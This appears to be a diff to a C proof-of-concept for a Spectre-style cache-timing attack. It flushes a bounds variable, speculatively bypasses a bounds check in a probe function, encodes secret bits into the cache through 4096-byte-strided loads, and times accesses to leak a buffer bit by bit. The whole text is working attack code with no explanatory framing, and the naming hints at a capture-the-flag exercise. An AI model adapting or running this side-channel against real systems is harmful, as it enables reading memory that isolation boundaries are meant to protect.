@@ -17,15 +17,28 @@ alignas(4096) __attribute__((section(".mysection"))) int ***p3 = &p2;
 alignas(4096) __attribute__((section(".mysection"))) char dummy = 1;
 alignas(4096) __attribute__((section(".mysection"))) char dummy2 = 1;
 
-static inline int get_bit_raw(int byte_idx, int bit_idx) {
+static inline unsigned get_bit_raw(char *buf, unsigned byte_idx, unsigned bit_idx) {
+#if 0
   return (buf[byte_idx] >> bit_idx) & 1;
+#else
+  unsigned result;
+  asm ("xor %%eax, %%eax\n" // Flags need to be cleared.
+       "mov %1, %%al\n"
+       "shr %%cl, %%al\n"
+       "and $1, %%al\n"
+       : "=&a"(result)
+       : "m"(buf[byte_idx]), "c"(bit_idx));
+  return result;
+#endif
 }
 
-static __attribute__((noinline)) void probe(int byte_idx, int bit_idx) {
-  if (byte_idx >= ***p3)
+static __attribute__((noinline)) void probe(char *buf, char *flag, unsigned byte_idx, unsigned bit_idx) {
+  // int len = ***p3;
+  int len = publen;
+  if (byte_idx >= len)
     return;
-  // asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
-  int val = get_bit_raw(byte_idx, bit_idx);
+  asm volatile ("mov %0, %%al" :: "m"(flag) : "al");
+  unsigned val = get_bit_raw(buf, byte_idx, bit_idx);
 #if 0
   asm ("mov %0, %%ecx\n"
        "mov $0, %%ax\n"
@@ -34,9 +47,11 @@ static __attribute__((noinline)) void probe(int byte_idx, int bit_idx) {
        :: "rcx", "rax", "rdx");
 #endif
 #if 1
-  volatile int x = (&flag)[4096 - 4096 * val];
+  volatile int x = flag[4096 - 4096 * val];
 #elif 1
-  volatile int x = (&flag)[val];
+  volatile int x = flag[val];
+#elif 0
+  volatile int x = flag;
 #endif
 }
 
@@ -67,7 +82,7 @@ static void init(void) {
   }
 }
 
-static int leak_bit(int byte_idx, int bit_idx) {
+static int leak_bit(char *buf, int byte_idx, int bit_idx) {
   int idx = PUBLEN * 4;
   order[idx].byte = byte_idx;
   order[idx].bit = bit_idx;
@@ -81,7 +96,7 @@ static int leak_bit(int byte_idx, int bit_idx) {
     _mm_clflush(&p3);
     _mm_lfence();
     _mm_mfence();
-    probe(order[i].byte, order[i].bit);
+    probe(buf, &flag, order[i].byte, order[i].bit);
     ts[i] = time_access(&flag);
   }
   order[idx].byte = idx / 8;
@@ -89,7 +104,7 @@ static int leak_bit(int byte_idx, int bit_idx) {
 
   // Check if the flag was cached.
   int t = ts[idx];
-  printf("%d\t%d\n", get_bit_raw(byte_idx, bit_idx), t);
+  printf("%d\t%d\n", get_bit_raw(buf, byte_idx, bit_idx), t);
   fflush(stdout);
 }
 
@@ -101,7 +116,7 @@ int main() {
       leak_bit(i, j);
     }
 #else
-    leak_bit(i, 0);
+    leak_bit(&buf[0], i, 0);
 #endif
   }
 }
